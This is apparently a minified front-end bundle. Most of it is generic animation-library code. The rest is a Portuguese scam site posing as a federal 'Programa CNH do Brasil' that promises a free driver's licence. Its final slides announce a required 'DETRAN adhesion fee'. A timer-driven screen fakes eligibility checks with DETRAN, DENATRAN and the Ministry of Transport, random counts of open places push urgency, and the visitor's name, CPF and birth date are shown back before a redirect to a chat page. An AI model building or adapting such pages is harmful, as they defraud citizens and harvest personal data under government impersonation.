        const { transitionEnd: v, transition: C, ...g } = b;
        for (const m in g) {
          let p = g[m];
          if (Array.isArray(p)) {
            const w = d ? p.length - 1 : 0;
            p = p[w]
          }
          p !== null && (s[m] = p)
        }
        for (const m in v)
          s[m] = v[m]
      }
    }
  }
  return s
}
const Th = () => ({
  style: {},
  transform: {},
  transformOrigin: {},
  vars: {}
})
  , Cw = () => ({
    ...Th(),
    attrs: {}
  })
  , Nw = (e, t) => t && typeof e == "number" ? t.transform(e) : e
  , TE = {
    x: "translateX",
    y: "translateY",
    z: "translateZ",
    transformPerspective: "perspective"
  }
  , kE = Fi.length;
function DE(e, t, n) {
  let r = ""
    , s = !0;
  for (let o = 0; o < kE; o++) {
    const i = Fi[o]
      , l = e[i];
    if (l === void 0)
      continue;
    let c = !0;
    if (typeof l == "number" ? c = l === (i.startsWith("scale") ? 1 : 0) : c = parseFloat(l) === 0,
      !c || n) {
      const u = Nw(l, uh[i]);
      if (!c) {
        s = !1;
        const d = TE[i] || i;
        r += `${d}(${u}) `
      }
      n && (t[i] = u)
    }
  }
  return r = r.trim(),
    n ? r = n(t, s ? "" : r) : s && (r = "none"),
    r
}
function kh(e, t, n) {
  const { style: r, vars: s, transformOrigin: o } = e;
  let i = !1
    , l = !1;
  for (const c in t) {
    const u = t[c];
    if (rs.has(c)) {
      i = !0;
      continue
    } else if (g1(c)) {
      s[c] = u;
      continue
    } else {
      const d = Nw(u, uh[c]);
      c.startsWith("origin") ? (l = !0,
        o[c] = d) : r[c] = d
    }
  }
  if (t.transform || (i || n ? r.transform = DE(t, e.transform, n) : r.transform && (r.transform = "none")),
    l) {
    const { originX: c = "50%", originY: u = "50%", originZ: d = 0 } = o;
    r.transformOrigin = `${c} ${u} ${d}`
  }
}
function Vg(e, t, n) {
  return typeof e == "string" ? e : Y.transform(t + n * e)
}
function ME(e, t, n) {
  const r = Vg(t, e.x, e.width)
    , s = Vg(n, e.y, e.height);
  return `${r} ${s}`
}
const RE = {
  offset: "stroke-dashoffset",
  array: "stroke-dasharray"
}
  , OE = {
    offset: "strokeDashoffset",
    array: "strokeDasharray"
  };
function IE(e, t, n = 1, r = 0, s = !0) {
  e.pathLength = 1;
  const o = s ? RE : OE;
  e[o.offset] = Y.transform(-r);
  const i = Y.transform(t)
    , l = Y.transform(n);
  e[o.array] = `${i} ${l}`
}
function Dh(e, { attrX: t, attrY: n, attrScale: r, originX: s, originY: o, pathLength: i, pathSpacing: l = 1, pathOffset: c = 0, ...u }, d, f) {
  if (kh(e, u, f),
    d) {
    e.style.viewBox && (e.attrs.viewBox = e.style.viewBox);
    return
  }
  e.attrs = e.style,
    e.style = {};
  const { attrs: h, style: y, dimensions: b } = e;
  h.transform && (b && (y.transform = h.transform),
    delete h.transform),
    b && (s !== void 0 || o !== void 0 || y.transform) && (y.transformOrigin = ME(b, s !== void 0 ? s : .5, o !== void 0 ? o : .5)),
    t !== void 0 && (h.x = t),
    n !== void 0 && (h.y = n),
    r !== void 0 && (h.scale = r),
    i !== void 0 && IE(h, i, l, c, !1)
}
const Mh = e => typeof e == "string" && e.toLowerCase() === "svg"
  , _E = {
    useVisualState: Sw({
      scrapeMotionValuesFromProps: bw,
      createRenderState: Cw,
      onMount: (e, t, { renderState: n, latestValues: r }) => {
        de.read(() => {
          try {
            n.dimensions = typeof t.getBBox == "function" ? t.getBBox() : t.getBoundingClientRect()
          } catch {
            n.dimensions = {
              x: 0,
              y: 0,
              width: 0,
              height: 0
            }
          }
        }
        ),
          de.render(() => {
            Dh(n, r, Mh(t.tagName), e.transformTemplate),
              xw(t, n)
          }
          )
      }
    })
  }
  , LE = {
    useVisualState: Sw({
      scrapeMotionValuesFromProps: Ah,
      createRenderState: Th
    })
  };
function jw(e, t, n) {
  for (const r in t)
    !Xe(t[r]) && !ww(r, n) && (e[r] = t[r])
}
function FE({ transformTemplate: e }, t) {
  return x.useMemo(() => {
    const n = Th();
    return kh(n, t, e),
      Object.assign({}, n.vars, n.style)
  }
    , [t])
}
function VE(e, t) {
  const n = e.style || {}
    , r = {};
  return jw(r, n, e),
    Object.assign(r, FE(e, t)),
    r
}
function BE(e, t) {
  const n = {}
    , r = VE(e, t);
  return e.drag && e.dragListener !== !1 && (n.draggable = !1,
    r.userSelect = r.WebkitUserSelect = r.WebkitTouchCallout = "none",
    r.touchAction = e.drag === !0 ? "none" : `pan-${e.drag === "x" ? "y" : "x"}`),
    e.tabIndex === void 0 && (e.onTap || e.onTapStart || e.whileTap) && (n.tabIndex = 0),
    n.style = r,
    n
}
const zE = new Set(["animate", "exit", "variants", "initial", "style", "values", "variants", "transition", "transformTemplate", "custom", "inherit", "onBeforeLayoutMeasure", "onAnimationStart", "onAnimationComplete", "onUpdate", "onDragStart", "onDrag", "onDragEnd", "onMeasureDragConstraints", "onDirectionLock", "onDragTransitionEnd", "_dragX", "_dragY", "onHoverStart", "onHoverEnd", "onViewportEnter", "onViewportLeave", "globalTapTarget", "ignoreStrict", "viewport"]);
function Nl(e) {
  return e.startsWith("while") || e.startsWith("drag") && e !== "draggable" || e.startsWith("layout") || e.startsWith("onTap") || e.startsWith("onPan") || e.startsWith("onLayout") || zE.has(e)
}
let Pw = e => !Nl(e);
function UE(e) {
  e && (Pw = t => t.startsWith("on") ? !Nl(t) : e(t))
}
try {
  UE(require("@emotion/is-prop-valid").default)
} catch { }
function $E(e, t, n) {
  const r = {};
  for (const s in e)
    s === "values" && typeof e.values == "object" || (Pw(s) || n === !0 && Nl(s) || !t && !Nl(s) || e.draggable && s.startsWith("onDrag")) && (r[s] = e[s]);
  return r
}
function HE(e, t, n, r) {
  const s = x.useMemo(() => {
    const o = Cw();
    return Dh(o, t, Mh(r), e.transformTemplate),
    {
      ...o.attrs,
      style: {
        ...o.style
      }
    }
  }
    , [t]);
  if (e.style) {
    const o = {};
    jw(o, e.style, e),
      s.style = {
        ...o,
        ...s.style
      }
  }
  return s
}
function WE(e = !1) {
  return (n, r, s, { latestValues: o }, i) => {
    const c = (Ph(n) ? HE : BE)(r, o, i, n)
      , u = $E(r, typeof n == "string", e)
      , d = n !== x.Fragment ? {
        ...u,
        ...c,
        ref: s
      } : {}
      , { children: f } = r
      , h = x.useMemo(() => Xe(f) ? f.get() : f, [f]);
    return x.createElement(n, {
      ...d,
      children: h
    })
  }
}
function QE(e, t) {
  return function (r, { forwardMotionProps: s } = {
    forwardMotionProps: !1
  }) {
    const i = {
      ...Ph(r) ? _E : LE,
      preloadedFeatures: e,
      useRender: WE(s),
      createVisualElement: t,
      Component: r
    };
    return SE(i)
  }
}
const Bd = {
  current: null
}
  , Aw = {
    current: !1
  };
function qE() {
  if (Aw.current = !0,
    !!jh)
    if (window.matchMedia) {
      const e = window.matchMedia("(prefers-reduced-motion)")
        , t = () => Bd.current = e.matches;
      e.addListener(t),
        t()
    } else
      Bd.current = !1
}
function GE(e, t, n) {
  for (const r in t) {
    const s = t[r]
      , o = n[r];
    if (Xe(s))
      e.addValue(r, s);
    else if (Xe(o))
      e.addValue(r, Pi(s, {
        owner: e
      }));
    else if (o !== s)
      if (e.hasValue(r)) {
        const i = e.getValue(r);
        i.liveStyle === !0 ? i.jump(s) : i.hasAnimated || i.set(s)
      } else {
        const i = e.getStaticValue(r);
        e.addValue(r, Pi(i !== void 0 ? i : s, {
          owner: e
        }))
      }
  }
  for (const r in n)
    t[r] === void 0 && e.removeValue(r);
  return t
}
const Bg = new WeakMap
  , KE = [...x1, Ke, Nr]
  , YE = e => KE.find(v1(e))
  , zg = ["AnimationStart", "AnimationComplete", "Update", "BeforeLayoutMeasure", "LayoutMeasure", "LayoutAnimationStart", "LayoutAnimationComplete"];
class XE {
  scrapeMotionValuesFromProps(t, n, r) {
    return {}
  }
  constructor({ parent: t, props: n, presenceContext: r, reducedMotionConfig: s, blockInitialAnimation: o, visualState: i }, l = {}) {
    this.current = null,
      this.children = new Set,
      this.isVariantNode = !1,
      this.isControllingVariants = !1,
      this.shouldReduceMotion = null,
      this.values = new Map,
      this.KeyframeResolver = ah,
      this.features = {},
      this.valueSubscriptions = new Map,
      this.prevMotionValues = {},
      this.events = {},
      this.propEventSubscriptions = {},
      this.notifyUpdate = () => this.notify("Update", this.latestValues),
      this.render = () => {
        this.current && (this.triggerBuild(),
          this.renderInstance(this.current, this.renderState, this.props.style, this.projection))
      }
      ,
      this.renderScheduledAt = 0,
      this.scheduleRender = () => {
        const h = gn.now();
        this.renderScheduledAt < h && (this.renderScheduledAt = h,
          de.render(this.render, !1, !0))
      }
      ;
    const { latestValues: c, renderState: u } = i;
    this.latestValues = c,
      this.baseTarget = {
        ...c
      },
      this.initialValues = n.initial ? {
        ...c
      } : {},
      this.renderState = u,
      this.parent = t,
      this.props = n,
      this.presenceContext = r,
      this.depth = t ? t.depth + 1 : 0,
      this.reducedMotionConfig = s,
      this.options = l,
      this.blockInitialAnimation = !!o,
      this.isControllingVariants = ac(n),
      this.isVariantNode = gw(n),
      this.isVariantNode && (this.variantChildren = new Set),
      this.manuallyAnimateOnMount = !!(t && t.current);
    const { willChange: d, ...f } = this.scrapeMotionValuesFromProps(n, {}, this);
    for (const h in f) {
      const y = f[h];
      c[h] !== void 0 && Xe(y) && y.set(c[h], !1)
    }
  }
  mount(t) {
    this.current = t,
      Bg.set(t, this),
      this.projection && !this.projection.instance && this.projection.mount(t),
      this.parent && this.isVariantNode && !this.isControllingVariants && (this.removeFromVariantTree = this.parent.addVariantChild(this)),
      this.values.forEach((n, r) => this.bindToMotionValue(r, n)),
      Aw.current || qE(),
      this.shouldReduceMotion = this.reducedMotionConfig === "never" ? !1 : this.reducedMotionConfig === "always" ? !0 : Bd.current,
      this.parent && this.parent.children.add(this),
      this.update(this.props, this.presenceContext)
  }
  unmount() {
    Bg.delete(this.current),
      this.projection && this.projection.unmount(),
      Cr(this.notifyUpdate),
      Cr(this.render),
      this.valueSubscriptions.forEach(t => t()),
      this.valueSubscriptions.clear(),
      this.removeFromVariantTree && this.removeFromVariantTree(),
      this.parent && this.parent.children.delete(this);
    for (const t in this.events)
      this.events[t].clear();
    for (const t in this.features) {
      const n = this.features[t];
      n && (n.unmount(),
        n.isMounted = !1)
    }
    this.current = null
  }
  bindToMotionValue(t, n) {
    this.valueSubscriptions.has(t) && this.valueSubscriptions.get(t)();
    const r = rs.has(t)
      , s = n.on("change", l => {
        this.latestValues[t] = l,
          this.props.onUpdate && de.preRender(this.notifyUpdate),
          r && this.projection && (this.projection.isTransformDirty = !0)
      }
      )
      , o = n.on("renderRequest", this.scheduleRender);
    let i;
    window.MotionCheckAppearSync && (i = window.MotionCheckAppearSync(this, t, n)),
      this.valueSubscriptions.set(t, () => {
        s(),
          o(),
          i && i(),
          n.owner && n.stop()
      }
      )
  }
  sortNodePosition(t) {
    return !this.current || !this.sortInstanceNodePosition || this.type !== t.type ? 0 : this.sortInstanceNodePosition(this.current, t.current)
  }
  updateFeatures() {
    let t = "animation";
    for (t in oo) {
      const n = oo[t];
      if (!n)
        continue;
      const { isEnabled: r, Feature: s } = n;
      if (!this.features[t] && s && r(this.props) && (this.features[t] = new s(this)),
        this.features[t]) {
        const o = this.features[t];
        o.isMounted ? o.update() : (o.mount(),
          o.isMounted = !0)
      }
    }
  }
  triggerBuild() {
    this.build(this.renderState, this.latestValues, this.props)
  }
  measureViewportBox() {
    return this.current ? this.measureInstanceViewportBox(this.current, this.props) : Ae()
  }
  getStaticValue(t) {
    return this.latestValues[t]
  }
  setStaticValue(t, n) {
    this.latestValues[t] = n
  }
  update(t, n) {
    (t.transformTemplate || this.props.transformTemplate) && this.scheduleRender(),
      this.prevProps = this.props,
      this.props = t,
      this.prevPresenceContext = this.presenceContext,
      this.presenceContext = n;
    for (let r = 0; r < zg.length; r++) {
      const s = zg[r];
      this.propEventSubscriptions[s] && (this.propEventSubscriptions[s](),
        delete this.propEventSubscriptions[s]);
      const o = "on" + s
        , i = t[o];
      i && (this.propEventSubscriptions[s] = this.on(s, i))
    }
    this.prevMotionValues = GE(this, this.scrapeMotionValuesFromProps(t, this.prevProps, this), this.prevMotionValues),
      this.handleChildMotionValue && this.handleChildMotionValue()
  }
  getProps() {
    return this.props
  }
  getVariant(t) {
    return this.props.variants ? this.props.variants[t] : void 0
  }
  getDefaultTransition() {
    return this.props.transition
  }
  getTransformPagePoint() {
    return this.props.transformPagePoint
  }
  getClosestVariantNode() {
    return this.isVariantNode ? this : this.parent ? this.parent.getClosestVariantNode() : void 0
  }
  addVariantChild(t) {
    const n = this.getClosestVariantNode();
    if (n)
      return n.variantChildren && n.variantChildren.add(t),
        () => n.variantChildren.delete(t)
  }
  addValue(t, n) {
    const r = this.values.get(t);
    n !== r && (r && this.removeValue(t),
      this.bindToMotionValue(t, n),
      this.values.set(t, n),
      this.latestValues[t] = n.get())
  }
  removeValue(t) {
    this.values.delete(t);
    const n = this.valueSubscriptions.get(t);
    n && (n(),
      this.valueSubscriptions.delete(t)),
      delete this.latestValues[t],
      this.removeValueFromRenderState(t, this.renderState)
  }
  hasValue(t) {
    return this.values.has(t)
  }
  getValue(t, n) {
    if (this.props.values && this.props.values[t])
      return this.props.values[t];
    let r = this.values.get(t);
    return r === void 0 && n !== void 0 && (r = Pi(n === null ? void 0 : n, {
      owner: this
    }),
      this.addValue(t, r)),
      r
  }
  readValue(t, n) {
    var r;
    let s = this.latestValues[t] !== void 0 || !this.current ? this.latestValues[t] : (r = this.getBaseTargetFromProps(this.props, t)) !== null && r !== void 0 ? r : this.readValueFromInstance(this.current, t, this.options);
    return s != null && (typeof s == "string" && (m1(s) || h1(s)) ? s = parseFloat(s) : !YE(s) && Nr.test(n) && (s = A1(t, n)),
      this.setBaseTarget(t, Xe(s) ? s.get() : s)),
      Xe(s) ? s.get() : s
  }
  setBaseTarget(t, n) {
    this.baseTarget[t] = n
  }
  getBaseTarget(t) {
    var n;
    const { initial: r } = this.props;
    let s;
    if (typeof r == "string" || typeof r == "object") {
      const i = eh(this.props, r, (n = this.presenceContext) === null || n === void 0 ? void 0 : n.custom);
      i && (s = i[t])
    }
    if (r && s !== void 0)
      return s;
    const o = this.getBaseTargetFromProps(this.props, t);
    return o !== void 0 && !Xe(o) ? o : this.initialValues[t] !== void 0 && s === void 0 ? void 0 : this.baseTarget[t]
  }
  on(t, n) {
    return this.events[t] || (this.events[t] = new wh),
      this.events[t].add(n)
  }
  notify(t, ...n) {
    this.events[t] && this.events[t].notify(...n)
  }
}
class Ew extends XE {
  constructor() {
    super(...arguments),
      this.KeyframeResolver = E1
  }
  sortInstanceNodePosition(t, n) {
    return t.compareDocumentPosition(n) & 2 ? 1 : -1
  }
  getBaseTargetFromProps(t, n) {
    return t.style ? t.style[n] : void 0
  }
  removeValueFromRenderState(t, { vars: n, style: r }) {
    delete n[t],
      delete r[t]
  }
  handleChildMotionValue() {
    this.childSubscription && (this.childSubscription(),
      delete this.childSubscription);
    const { children: t } = this.props;
    Xe(t) && (this.childSubscription = t.on("change", n => {
      this.current && (this.current.textContent = `${n}`)
    }
    ))
  }
}
function JE(e) {
  return window.getComputedStyle(e)
}
class ZE extends Ew {
  constructor() {
    super(...arguments),
      this.type = "html",
      this.renderInstance = yw
  }
  readValueFromInstance(t, n) {
    if (rs.has(n)) {
      const r = dh(n);
      return r && r.default || 0
    } else {
      const r = JE(t)
        , s = (g1(n) ? r.getPropertyValue(n) : r[n]) || 0;
      return typeof s == "string" ? s.trim() : s
    }
  }
  measureInstanceViewportBox(t, { transformPagePoint: n }) {
    return ew(t, n)
  }
  build(t, n, r) {
    kh(t, n, r.transformTemplate)
  }
  scrapeMotionValuesFromProps(t, n, r) {
    return Ah(t, n, r)
  }
}
class eT extends Ew {
  constructor() {
    super(...arguments),
      this.type = "svg",
      this.isSVGTag = !1,
      this.measureInstanceViewportBox = Ae
  }
  getBaseTargetFromProps(t, n) {
    return t[n]
  }
  readValueFromInstance(t, n) {
    if (rs.has(n)) {
      const r = dh(n);
      return r && r.default || 0
    }
    return n = vw.has(n) ? n : bh(n),
      t.getAttribute(n)
  }
  scrapeMotionValuesFromProps(t, n, r) {
    return bw(t, n, r)
  }
  build(t, n, r) {
    Dh(t, n, this.isSVGTag, r.transformTemplate)
  }
  renderInstance(t, n, r, s) {
    xw(t, n, r, s)
  }
  mount(t) {
    this.isSVGTag = Mh(t.tagName),
      super.mount(t)
  }
}
const tT = (e, t) => Ph(e) ? new eT(t) : new ZE(t, {
  allowProjection: e !== x.Fragment
})
  , nT = QE({
    ...U4,
    ...hE,
    ...nE,
    ...mE
  }, tT)
  , xu = B3(nT);
class rT extends x.Component {
  getSnapshotBeforeUpdate(t) {
    const n = this.props.childRef.current;
    if (n && t.isPresent && !this.props.isPresent) {
      const r = this.props.sizeRef.current;
      r.height = n.offsetHeight || 0,
        r.width = n.offsetWidth || 0,
        r.top = n.offsetTop,
        r.left = n.offsetLeft
    }
    return null
  }
  componentDidUpdate() { }
  render() {
    return this.props.children
  }
}
function sT({ children: e, isPresent: t }) {
  const n = x.useId()
    , r = x.useRef(null)
    , s = x.useRef({
      width: 0,
      height: 0,
      top: 0,
      left: 0
    })
    , { nonce: o } = x.useContext(Nh);
  return x.useInsertionEffect(() => {
    const { width: i, height: l, top: c, left: u } = s.current;
    if (t || !r.current || !i || !l)
      return;
    r.current.dataset.motionPopId = n;
    const d = document.createElement("style");
    return o && (d.nonce = o),
      document.head.appendChild(d),
      d.sheet && d.sheet.insertRule(`
          [data-motion-pop-id="${n}"] {
            position: absolute !important;
            width: ${i}px !important;
            height: ${l}px !important;
            top: ${c}px !important;
            left: ${u}px !important;
          }
        `),
      () => {
        document.head.removeChild(d)
      }
  }
    , [t]),
    a.jsx(rT, {
      isPresent: t,
      childRef: r,
      sizeRef: s,
      children: x.cloneElement(e, {
        ref: r
      })
    })
}
const oT = ({ children: e, initial: t, isPresent: n, onExitComplete: r, custom: s, presenceAffectsLayout: o, mode: i }) => {
  const l = Eh(iT)
    , c = x.useId()
    , u = x.useCallback(f => {
      l.set(f, !0);
      for (const h of l.values())
        if (!h)
          return;
      r && r()
    }
      , [l, r])
    , d = x.useMemo(() => ({
      id: c,
      initial: t,
      isPresent: n,
      custom: s,
      onExitComplete: u,
      register: f => (l.set(f, !1),
        () => l.delete(f))
    }), o ? [Math.random(), u] : [n, u]);
  return x.useMemo(() => {
    l.forEach((f, h) => l.set(h, !1))
  }
    , [n]),
    x.useEffect(() => {
      !n && !l.size && r && r()
    }
      , [n]),
    i === "popLayout" && (e = a.jsx(sT, {
      isPresent: n,
      children: e
    })),
    a.jsx(oc.Provider, {
      value: d,
      children: e
    })
}
  ;
function iT() {
  return new Map
}
const ba = e => e.key || "";
function Ug(e) {
  const t = [];
  return x.Children.forEach(e, n => {
    x.isValidElement(n) && t.push(n)
  }
  ),
    t
}
const $g = ({ children: e, exitBeforeEnter: t, custom: n, initial: r = !0, onExitComplete: s, presenceAffectsLayout: o = !0, mode: i = "sync" }) => {
  const l = x.useMemo(() => Ug(e), [e])
    , c = l.map(ba)
    , u = x.useRef(!0)
    , d = x.useRef(l)
    , f = Eh(() => new Map)
    , [h, y] = x.useState(l)
    , [b, v] = x.useState(l);
  hw(() => {
    u.current = !1,
      d.current = l;
    for (let m = 0; m < b.length; m++) {
      const p = ba(b[m]);
      c.includes(p) ? f.delete(p) : f.get(p) !== !0 && f.set(p, !1)
    }
  }
    , [b, c.length, c.join("-")]);
  const C = [];
  if (l !== h) {
    let m = [...l];
    for (let p = 0; p < b.length; p++) {
      const w = b[p]
        , S = ba(w);
      c.includes(S) || (m.splice(p, 0, w),
        C.push(w))
    }
    i === "wait" && C.length && (m = C),
      v(Ug(m)),
      y(l);
    return
  }
  const { forceRender: g } = x.useContext(Sh);
  return a.jsx(a.Fragment, {
    children: b.map(m => {
      const p = ba(m)
        , w = l === b || c.includes(p)
        , S = () => {
          if (f.has(p))
            f.set(p, !0);
          else
            return;
          let N = !0;
          f.forEach(P => {
            P || (N = !1)
          }
          ),
            N && (g == null || g(),
              v(d.current),
              s && s())
        }
        ;
      return a.jsx(oT, {
        isPresent: w,
        initial: !u.current || r ? void 0 : !1,
        custom: w ? void 0 : n,
        presenceAffectsLayout: o,
        mode: i,
        onExitComplete: w ? void 0 : S,
        children: m
      }, p)
    }
    )
  })
}
  , ls = [{
    title: "Programa CNH do Brasil",
    content: "O Programa CNH do Brasil é uma iniciativa do Governo Federal que pode garantir sua Carteira Nacional de Habilitação 100% GRATUITA! Se você for aprovado nos critérios do programa, não pagará nada pela sua CNH. Continue seu cadastro aqui no site para verificar sua elegibilidade.",
    image: "https://www.serpro.gov.br/menu/noticias/noticias-2025/cnh-do-brasil/@@images/image/large"
  }, {
    title: "Acesso ao Aplicativo",
    content: "Após finalizar seu cadastro, você receberá acesso ao aplicativo oficial do programa. Use seu CPF para acessar e acompanhar todo o processo de obtenção da sua CNH de forma simples e prática.",
    image: "https://cnhbrasil.app/images/mockup-app-500x461.png"
  }, {
    title: "Aulas Teóricas e Práticas",
    content: "Suas aulas teóricas serão realizadas 100% pelo aplicativo, totalmente GRATUITAS! Para a parte prática, você precisará fazer apenas 2 horas de aula com um instrutor credenciado pelo DETRAN. Se você for aprovado para a gratuidade do programa, essas aulas práticas também serão gratuitas!",
    image: "https://cnhbrasil.app/images/mockup-app-500x461.png"
  }, {
    title: "Emissão da CNH",
    content: "Após aprovação nos exames teórico e prático, sua CNH será emitida e enviada diretamente para seu endereço. Todo o processo é acompanhado pelo sistema oficial do programa.",
    image: "https://cnhbrasil.app/images/mockup-app-500x461.png"
  }, {
    title: "Taxa de Adesão DETRAN",
    content: "Para validar sua participação no programa, o DETRAN cobra uma taxa administrativa de adesão. Esta taxa é obrigatória para verificar sua elegibilidade e garantir seu acesso ao Programa CNH do Brasil.",
    image: "https://upload.wikimedia.org/wikipedia/commons/2/2b/MTRANSAssinatura.png"
  }];
function aT() {
  const [e, t] = x.useState(0)
    , [n, r] = x.useState("idle")
    , [, s] = Un()
    , i = new URLSearchParams(window.location.search).get("data")
    , l = async () => {
      r("loading"),
        await new Promise(c => setTimeout(c, 1e3)),
        e < ls.length - 1 ? (r("success"),
          setTimeout(() => {
            t(c => c + 1),
              r("idle")
          }
            , 500)) : (r("success"),
              setTimeout(() => {
                s(`/verify-availability?data=${i}&${new URLSearchParams(window.location.search).toString()}`)
              }
                , 500))
    }
    ;
  return a.jsxs("div", {
    children: [a.jsx(st, {}), a.jsx("div", {
      className: "container",
      style: {
        maxWidth: "none",
        width: "100%"
      },
      children: a.jsx("main", {
        id: "main-signin",
        style: {
          width: "100%",
          maxWidth: "1200px",
          margin: "0 auto",
          padding: "2rem"
        },
        children: a.jsx("div", {
          className: "w-full",
          children: a.jsxs("div", {
            children: [a.jsxs(xu.div, {
              className: "flex items-center gap-3 mb-4",
              initial: {
                opacity: 0,
                y: 20
              },
              animate: {
                opacity: 1,
                y: 0
              },
              transition: {
                duration: .3
              },
              children: [a.jsx("div", {
                className: "flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium",
                children: e + 1
              }), a.jsx("p", {
                className: "font-semibold text-base",
                children: ls[e].title
              })]
            }), a.jsxs("div", {
              className: "space-y-3 flex flex-col items-center",
              children: [a.jsx($g, {
                mode: "wait",
                children: a.jsx(xu.div, {
                  initial: {
                    opacity: 0,
                    x: 50
                  },
                  animate: {
                    opacity: 1,
                    x: 0
                  },
                  exit: {
                    opacity: 0,
                    x: -50
                  },
                  transition: {
                    duration: .5
                  },
                  className: "flex justify-center mb-4",
                  children: a.jsx("img", {
                    src: ls[e].image,
                    alt: ls[e].title,
                    className: "w-[380px] h-auto md:w-[480px] object-contain rounded-[10px] shadow-lg",
                    style: {
                      maxHeight: "400px"
                    }
                  })
                }, e)
              }), a.jsx($g, {
                mode: "wait",
                children: a.jsx(xu.div, {
                  initial: {
                    opacity: 0,
                    y: 20
                  },
                  animate: {
                    opacity: 1,
                    y: 0
                  },
                  exit: {
                    opacity: 0,
                    y: -20
                  },
                  transition: {
                    duration: .5
                  },
                  className: "bg-gray-50 p-8 rounded-md w-[380px] md:w-[480px]",
                  children: a.jsx("p", {
                    className: "text-gray-700 leading-relaxed text-base",
                    children: ls[e].content
                  })
                }, e)
              })]
            }), a.jsx("div", {
              className: "flex justify-center mt-6",
              children: a.jsxs("button", {
                type: "button",
                onClick: l,
                disabled: n !== "idle",
                className: "button-continuar flex items-center justify-center gap-2 min-w-[160px]",
                children: [n === "loading" && a.jsx(dt, {
                  className: "h-4 w-4 animate-spin"
                }), n === "success" && a.jsx(Ft, {
                  className: "h-4 w-4"
                }), n === "loading" ? "Processando..." : n === "success" ? "Concluído" : e === ls.length - 1 ? "Finalizar" : "Avançar"]
              })
            })]
          })
        })
      })
    })]
  })
}
const lT = [{
  uf: "AC",
  nome: "Acre"
}, {
  uf: "AL",
  nome: "Alagoas"
}, {
  uf: "AP",
  nome: "Amapá"
}, {
  uf: "AM",
  nome: "Amazonas"
}, {
  uf: "BA",
  nome: "Bahia"
}, {
  uf: "CE",
  nome: "Ceará"
}, {
  uf: "DF",
  nome: "Distrito Federal"
}, {
  uf: "ES",
  nome: "Espírito Santo"
}, {
  uf: "GO",
  nome: "Goiás"
}, {
  uf: "MA",
  nome: "Maranhão"
}, {
  uf: "MT",
  nome: "Mato Grosso"
}, {
  uf: "MS",
  nome: "Mato Grosso do Sul"
}, {
  uf: "MG",
  nome: "Minas Gerais"
}, {
  uf: "PA",
  nome: "Pará"
}, {
  uf: "PB",
  nome: "Paraíba"
}, {
  uf: "PR",
  nome: "Paraná"
}, {
  uf: "PE",
  nome: "Pernambuco"
}, {
  uf: "PI",
  nome: "Piauí"
}, {
  uf: "RJ",
  nome: "Rio de Janeiro"
}, {
  uf: "RN",
  nome: "Rio Grande do Norte"
}, {
  uf: "RS",
  nome: "Rio Grande do Sul"
}, {
  uf: "RO",
  nome: "Rondônia"
}, {
  uf: "RR",
  nome: "Roraima"
}, {
  uf: "SC",
  nome: "Santa Catarina"
}, {
  uf: "SP",
  nome: "São Paulo"
}, {
  uf: "SE",
  nome: "Sergipe"
}, {
  uf: "TO",
  nome: "Tocantins"
}];
function cT() {
  const [, e] = Un()
    , [t, n] = x.useState(0)
    , [r, s] = x.useState("analyzing")
    , [o, i] = x.useState(null)
    , l = x.useMemo(() => lT.map(h => ({
      uf: h.uf,
      nome: h.nome,
      vagas: Math.floor(Math.random() * 60) + 43
    })), [])
    , c = [{
      id: 1,
      message: "Verificando dados junto ao DETRAN",
      completed: !1
    }, {
      id: 2,
      message: "Consultando elegibilidade do CPF no DENATRAN",
      completed: !1
    }, {
      id: 3,
      message: "Verificando disponibilidade de vagas no programa",
      completed: !1
    }, {
      id: 4,
      message: "Analisando documentação junto ao Ministério dos Transportes",
      completed: !1
    }];
  x.useEffect(() => {
    const h = localStorage.getItem("userData");
    h && i(JSON.parse(h));
    const y = 2500;
    let b = 0;
    const v = setInterval(() => {
      b < c.length ? (n(b),
        b++) : (clearInterval(v),
          s("approved"))
    }
      , y);
    return () => clearInterval(v)
  }
    , []);
  const u = h => h.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
    , d = h => {
      if (!h)
        return "";
      if (/^\d{2}\/\d{2}\/\d{4}$/.test(h))
        return h;
      if (/^\d{4}-\d{2}-\d{2}$/.test(h)) {
        const [b, v, C] = h.split("-");
        return `${C}/${v}/${b}`
      }
      const y = new Date(h);
      return isNaN(y.getTime()) ? h : y.toLocaleDateString("pt-BR")
    }
    , f = h => {
      localStorage.setItem("selectedDetran", JSON.stringify(h)),
        e("/chat" + window.location.search)
    }
    ;
  return a.jsxs("div", {
    children: [a.jsx(st, {}), a.jsx("div", {
      className: "container mx-auto px-4 py-6",
      children: o && a.jsxs("div", {
        className: "max-w-4xl mx-auto",
        children: [a.jsxs("div", {
          className: "grid grid-cols-2 gap-4 mb-6",
          children: [a.jsxs("div", {
            className: "col-span-2",
            children: [a.jsx("label", {
              className: "block text-sm font-medium text-gray-700",
              children: "Nome Completo"
            }), a.jsx("input", {
              type: "text",
              value: o.nome,
              disabled: !0,
              className: "mt-1 block w-full px-3 py-2 bg-white border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-[#1351B4] focus:border-[#1351B4]"
            })]
          }), a.jsxs("div", {
            children: [a.jsx("label", {
              className: "block text-sm font-medium text-gray-700",
              children: "CPF"
            }), a.jsx("input", {
              type: "text",
              value: u(o.cpf),
              disabled: !0,
              className: "mt-1 block w-full px-3 py-2 bg-white border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-[#1351B4] focus:border-[#1351B4]"
            })]
          }), a.jsxs("div", {
            children: [a.jsx("label", {
              className: "block text-sm font-medium text-gray-700",
              children: "Nascimento"
            }), a.jsx("input", {
              type: "text",
              value: d(o.dataNascimento),
              disabled: !0,
              className: "mt-1 block w-full px-3 py-2 bg-white border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-[#1351B4] focus:border-[#1351B4]"
            })]
          })]
        }), a.jsxs("div", {
          className: "mt-8 border-t border-gray-200 pt-8",
          children: [r === "analyzing" && a.jsx("div", {
            className: "space-y-6",
            children: c.map((h, y) => a.jsxs("div", {
              className: `flex items-center gap-3 ${y > t ? "opacity-40" : ""}`,
              children: [y === t ? a.jsx(dt, {
                className: "h-5 w-5 animate-spin text-green-600"
              }) : y < t ? a.jsx("div", {
                className: "flex items-center justify-center w-6 h-6 rounded-full bg-green-100",
                children: a.jsx(Ft, {
                  className: "h-4 w-4 text-green-600"
                })
              }) : a.jsx("div", {
                className: "w-6 h-6 rounded-full border-2 border-gray-200"
              }), a.jsx("span", {
                className: "font-medium",
                children: h.message
              })]
            }, h.id))
          }), r === "approved" && a.jsxs("div", {
